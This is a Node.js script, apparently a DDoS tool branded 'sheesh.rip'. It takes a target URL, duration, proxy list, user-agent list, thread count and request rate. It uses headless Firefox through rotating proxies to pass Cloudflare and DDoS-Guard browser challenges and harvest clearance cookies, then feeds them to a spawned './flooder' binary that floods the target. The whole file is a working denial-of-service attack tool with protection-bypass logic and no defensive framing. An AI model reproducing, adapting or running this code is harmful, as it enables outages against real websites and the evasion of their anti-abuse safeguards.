const fs = require('fs'),
    playwright = require('playwright-extra'),
    url = require('url'),
    colors = require('colors');
const {spawn} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (err) {
console.log(err)
});

if (process.argv.length < 8) {
    console.log(colors.red('sheesh.rip -'), colors.blue('URL Time ProxyList UserAgentList Threads RQ/IP'));
    console.log(colors.red('sheesh.rip -'), colors.blue('https://sheesh.rip/ 120 http.txt ua.txt 10 64'));
    process.exit(0);
}

async function main() {
    console.log(colors.red('sheesh.rip -'), colors.blue('Owner: @udbnt | BROWSER'));
    const urls = process.argv[2], duration = process.argv[3], proxy = process.argv[4], useragent = process.argv[5],
        threads = process.argv[6], ratelimit = process.argv[7], randquery = process.argv[8],
        addua = fs.readFileSync(useragent, 'utf-8').toString().replace(/\r/g, '').split('\n'),
        proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
    let domain = url.parse(urls).hostname;
    var sessis = [];

    function ua() {
        return addua[Math.floor(Math.random() * addua.length)]
    }

    function randomProxies() {
        const randproxies = proxies[Math.floor(Math.random() * proxies.length)];
        proxies.remove(randproxies)
        return randproxies;
    }

    Array.prototype.remove = function () {
        var what, a = arguments,
            L = a.length,
            ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };

    async function addsession() {
        try {
            const useragents = ua(),
                proxoid = randomProxies();
            solving({
                'urls': urls,
                'proxoid': proxoid,
                'useragents': useragents
            }).then((cookie, ua) => {
                let goodcookie = "";
                let laa_ = JSON.stringify(cookie);
                laa_ = JSON.parse(laa_);
                laa_.forEach((value) => {
                    const valueString = value.name + "=" + value.value + "; ";
                    goodcookie += valueString;
                });
                goodcookie = goodcookie.slice(0, -2);
                sessis.push({
                    'urls': urls,
                    'proxoid': proxoid,
                    'useragents': useragents
                })
                console.log(colors.red('sheesh.rip -'), 'User-Agent: ' + useragents, 'Cookie: ' + goodcookie, 'Proxy: ' + proxoid);
                post(urls, proxoid, domain, useragents, duration, goodcookie, threads, ratelimit, randquery);
            }).catch((ee) => {
                try {
					if(proxoid != "undefined") {
						addsession();
					}
                } catch (e) {
                }
            })
        } catch (e) {
        }
    }

    for (let start = 0; start < threads; start++) {
        console.log(colors.red('sheesh.rip -'), 'Create session: #' + start);
			addsession();
    }
}

main();

function solving(message) {
    return new Promise((resolve, reject) => {
        console.log(colors.red('sheesh.rip -'), 'Proxy added: ' + message.proxoid);
        playwright.firefox.launch({
            proxy: {
                server: message.proxoid
            },
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--enable-automation',
                '--disable-blink-features',
                '--disable-blink-features=AutomationControlled',
                '--hide-scrollbars',
                '--mute-audio',
                '--disable-canvas-aa',
                '--disable-2d-canvas-clip-aa',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-spki-list',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-gpu',
                '--disable-sync',
                '--disable-plugins-discovery',
                '--disable-preconnect',
                '--disable-notifications',
                '--no-startup-window',
                '--enable-monitor-profile',
                '--no-remote',
                '--wait-for-browser',
                '--foreground',
                '--juggler-pipe',
                '--silent',
            ]
        }).then(async (browser) => {

            const page = await browser.newPage({userAgent: message.useragents});
            await page.setViewportSize({width: 1920, height: 1080});
            try {
                const gotolink = await page.goto(message.urls);
            } catch (error1) {
                reject(error1);
                await browser.close();
            }

            try {
                await page.waitForTimeout(8000, {waitUntil: 'networkidle0'});
                const title = await page.title();
                if (title == "Just a moment...") {
                    await browser.close();
                }
                if (title == "DDOS-GUARD") {
                    await browser.close();
                }
                const cookies = await page.context().cookies();
                if (cookies) {
                    resolve(cookies);
                    await browser.close();
                    return;
                }
            } catch (error2) {
                reject(error2);
                await browser.close();
            }

        })
    })
}

function post(urls, proxoid, domain, useragents, duration, goodcookie, threads, ratelimit, randquery) {
    let promise = new Promise((res, rej) => {
        const ls = spawn('./flooder', ["host=" + urls, "limit=" + ratelimit, "time=" + duration, "good=" + proxoid, "ua=" + useragents, "threads=1000", "cookie=" + goodcookie]);
        ls.stdout.on('data', (data) => {
            return res();
        });
    })
}